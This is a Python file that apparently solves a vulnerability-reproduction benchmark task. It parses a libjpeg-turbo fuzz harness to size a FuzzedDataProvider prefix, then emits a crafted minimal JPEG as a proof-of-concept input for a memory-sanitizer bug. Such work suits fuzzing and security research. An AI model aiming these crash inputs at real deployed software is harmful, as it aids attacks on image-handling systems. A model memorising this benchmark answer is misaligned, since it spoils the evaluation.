import os
import re
import tarfile
from typing import Dict, Optional, Tuple


def _is_texty_source(name: str) -> bool:
    n = name.lower()
    exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx")
    return n.endswith(exts)


def _read_text_bytes(b: bytes) -> str:
    try:
        return b.decode("utf-8", "ignore")
    except Exception:
        try:
            return b.decode("latin-1", "ignore")
        except Exception:
            return ""


def _sanitize_cpp(code: str) -> str:
    # Replace comments and string/char literals with spaces, preserving length.
    s = code
    out = list(s)
    n = len(s)
    i = 0

    def fill(a: int, b: int):
        for k in range(a, b):
            out[k] = ' '

    while i < n:
        c = s[i]
        if c == '/' and i + 1 < n:
            c2 = s[i + 1]
            if c2 == '/':
                j = i + 2
                while j < n and s[j] != '\n':
                    j += 1
                fill(i, j)
                i = j
                continue
            if c2 == '*':
                j = i + 2
                while j + 1 < n and not (s[j] == '*' and s[j + 1] == '/'):
                    j += 1
                j = min(n, j + 2)
                fill(i, j)
                i = j
                continue

        # Raw string literal R"delim( ... )delim"
        if c == 'R' and i + 1 < n and s[i + 1] == '"':
            # Parse delimiter up to '('
            j = i + 2
            while j < n and s[j] != '(':
                j += 1
            if j < n and s[j] == '(':
                delim = s[i + 2:j]
                end_pat = ')' + delim + '"'
                k = s.find(end_pat, j + 1)
                if k != -1:
                    end = k + len(end_pat)
                    fill(i, end)
                    i = end
                    continue

        if c == '"':
            j = i + 1
            while j < n:
                if s[j] == '\\' and j + 1 < n:
                    j += 2
                    continue
                if s[j] == '"':
                    j += 1
                    break
                j += 1
            fill(i, j)
            i = j
            continue

        if c == "'":
            j = i + 1
            while j < n:
                if s[j] == '\\' and j + 1 < n:
                    j += 2
                    continue
                if s[j] == "'":
                    j += 1
                    break
                j += 1
            fill(i, j)
            i = j
            continue

        i += 1

    return "".join(out)


def _find_matching_brace(s: str, open_index: int) -> int:
    # s[open_index] must be '{'
    depth = 0
    n = len(s)
    i = open_index
    while i < n:
        if s[i] == '{':
            depth += 1
        elif s[i] == '}':
            depth -= 1
            if depth == 0:
                return i
        i += 1
    return -1


def _extract_fuzzer_body(sanitized: str) -> Optional[str]:
    m = re.search(r'\bLLVMFuzzerTestOneInput\b', sanitized)
    if not m:
        # Some projects use FUZZER_TEST_ONE_INPUT
        m = re.search(r'\bFUZZER_TEST_ONE_INPUT\b', sanitized)
        if not m:
            return None
    i = m.end()
    brace = sanitized.find('{', i)
    if brace == -1:
        return None
    end = _find_matching_brace(sanitized, brace)
    if end == -1:
        return None
    return sanitized[brace + 1:end]


def _find_jpeg_extraction_pos(body: str) -> Optional[int]:
    candidates = []
    for needle in (
        ".ConsumeRemainingBytes",
        ".ConsumeRemainingBytesAsString",
        ".ConsumeRemainingBytesAsVector",
    ):
        p = body.find(needle)
        if p != -1:
            candidates.append(p)
    # Pattern: ConsumeBytes<...>(...remaining_bytes...)
    m = re.search(r'\.ConsumeBytes\s*<[^>]+>\s*\(\s*[^)]*remaining_bytes', body)
    if m:
        candidates.append(m.start())
    if not candidates:
        return None
    return min(candidates)


_TYPE_SIZES: Dict[str, int] = {
    "uint8_t": 1,
    "int8_t": 1,
    "unsigned char": 1,
    "signed char": 1,
    "char": 1,
    "bool": 1,

    "uint16_t": 2,
    "int16_t": 2,
    "unsigned short": 2,
    "short": 2,

    "uint32_t": 4,
    "int32_t": 4,
    "unsigned int": 4,
    "int": 4,
    "float": 4,

    "uint64_t": 8,
    "int64_t": 8,
    "unsigned long long": 8,
    "long long": 8,
    "double": 8,
    "size_t": 8,
    "ssize_t": 8,

    "unsigned long": 8,  # on 64-bit Linux
    "long": 8,
}


def _sizeof_type(type_str: str) -> int:
    t = " ".join(type_str.strip().replace("\n", " ").split())
    t = re.sub(r'\bconst\b', '', t)
    t = re.sub(r'\bvolatile\b', '', t)
    t = re.sub(r'\bstruct\b', '', t)
    t = " ".join(t.split())

    # Strip pointers/references
    t = t.replace("&", "").replace("*", "").strip()
    t = " ".join(t.split())

    # Normalize common aliases
    if t in _TYPE_SIZES:
        return _TYPE_SIZES[t]

    # Handle std::size_t
    if t.endswith("::size_t"):
        return 8

    # Handle unsigned/signed without width keyword
    if t == "unsigned":
        return 4
    if t == "signed":
        return 4

    # If template args include uint8_t etc, try last token
    last = t.split()[-1] if t else ""
    if last in _TYPE_SIZES:
        return _TYPE_SIZES[last]

    return 4


def _compute_prefix_len_from_source(source_text: str) -> int:
    sanitized = _sanitize_cpp(source_text)
    body = _extract_fuzzer_body(sanitized)
    if not body:
        return 0
    if "FuzzedDataProvider" not in sanitized and "FuzzedDataProvider" not in body:
        return 0

    pos = _find_jpeg_extraction_pos(body)
    if pos is None:
        return 0

    prefix_text = body[:pos]

    total = 0

    # ConsumeBool()
    total += len(re.findall(r'\.ConsumeBool\s*\(\s*\)', prefix_text)) * 1

    # ConsumeIntegral / ConsumeIntegralInRange
    for m in re.finditer(r'\.ConsumeIntegral(?:InRange)?\s*<\s*([^>]+?)\s*>', prefix_text):
        total += _sizeof_type(m.group(1))

    # ConsumeFloatingPoint
    for m in re.finditer(r'\.ConsumeFloatingPoint\s*<\s*([^>]+?)\s*>', prefix_text):
        total += _sizeof_type(m.group(1))

    # ConsumeEnum
    for m in re.finditer(r'\.ConsumeEnum\s*<\s*([^>]+?)\s*>', prefix_text):
        total += _sizeof_type(m.group(1))

    # ConsumeBytes<T>(N) where N is a literal integer
    for m in re.finditer(r'\.ConsumeBytes\s*<\s*([^>]+?)\s*>\s*\(\s*([0-9]+)\s*\)', prefix_text):
        elem = _sizeof_type(m.group(1))
        n = int(m.group(2))
        if 0 <= n <= 1_000_000:
            total += elem * n

    # Bound to something reasonable
    if total < 0:
        total = 0
    if total > 4096:
        # Likely misparsed or counts inside non-executed paths; fall back.
        return 0
    return total


def _minimal_color_jpeg_1x1() -> bytes:
    soi = b"\xff\xd8"
    dqt = b"\xff\xdb\x00\x43\x00" + (b"\x01" * 64)
    sof0 = (
        b"\xff\xc0\x00\x11\x08"
        b"\x00\x01"  # height
        b"\x00\x01"  # width
        b"\x03"      # components
        b"\x01\x11\x00"
        b"\x02\x11\x00"
        b"\x03\x11\x00"
    )
    bits = b"\x01" + (b"\x00" * 15)  # 1 code of length 1
    dht_payload = (
        b"\x00" + bits + b"\x00" +   # DC table 0 with symbol 0
        b"\x10" + bits + b"\x00"     # AC table 0 with symbol 0 (EOB)
    )
    dht = b"\xff\xc4\x00\x26" + dht_payload
    sos = (
        b"\xff\xda\x00\x0c\x03"
        b"\x01\x00"
        b"\x02\x00"
        b"\x03\x00"
        b"\x00\x3f\x00"
    )
    entropy = b"\x03"
    eoi = b"\xff\xd9"
    return soi + dqt + sof0 + dht + sos + entropy + eoi


def _find_best_fuzzer_source(src_path: str) -> Optional[str]:
    best_score = -1
    best_text = None

    def score_text(path: str, txt: str) -> int:
        t = txt
        p = path.lower()
        sc = 0
        if "LLVMFuzzerTestOneInput" in t or "FUZZER_TEST_ONE_INPUT" in t:
            sc += 100
        if "FuzzedDataProvider" in t:
            sc += 25
        if "tj3" in t:
            sc += 30
        if "tj3Alloc" in t:
            sc += 40
        if "ZERO_BUFFERS" in t:
            sc += 40
        if "tj3Compress" in t or "tjCompress" in t:
            sc += 20
        if "tj3Transform" in t or "tjTransform" in t:
            sc += 20
        if "turbojpeg" in t.lower() or "TurboJPEG" in t:
            sc += 10
        if "/fuzz" in p or "fuzz" in p or "fuzzer" in p:
            sc += 10
        if "msan" in t.lower():
            sc += 10
        return sc

    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                rel = os.path.relpath(os.path.join(root, fn), src_path)
                if not _is_texty_source(fn):
                    continue
                try:
                    with open(os.path.join(root, fn), "rb") as f:
                        b = f.read()
                except Exception:
                    continue
                txt = _read_text_bytes(b)
                if "LLVMFuzzerTestOneInput" not in txt and "FUZZER_TEST_ONE_INPUT" not in txt:
                    continue
                sc = score_text(rel, txt)
                if sc > best_score:
                    best_score = sc
                    best_text = txt
        return best_text

    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                name = m.name
                base = os.path.basename(name)
                if not _is_texty_source(base):
                    continue
                if m.size <= 0 or m.size > 2_000_000:
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    b = f.read()
                except Exception:
                    continue
                txt = _read_text_bytes(b)
                if "LLVMFuzzerTestOneInput" not in txt and "FUZZER_TEST_ONE_INPUT" not in txt:
                    continue
                sc = score_text(name, txt)
                if sc > best_score:
                    best_score = sc
                    best_text = txt
    except Exception:
        return None

    return best_text


class Solution:
    def solve(self, src_path: str) -> bytes:
        jpeg = _minimal_color_jpeg_1x1()
        fuzzer_src = _find_best_fuzzer_source(src_path)
        if not fuzzer_src:
            return jpeg

        prefix_len = _compute_prefix_len_from_source(fuzzer_src)
        if prefix_len <= 0:
            return jpeg

        return (b"\x00" * prefix_len) + jpeg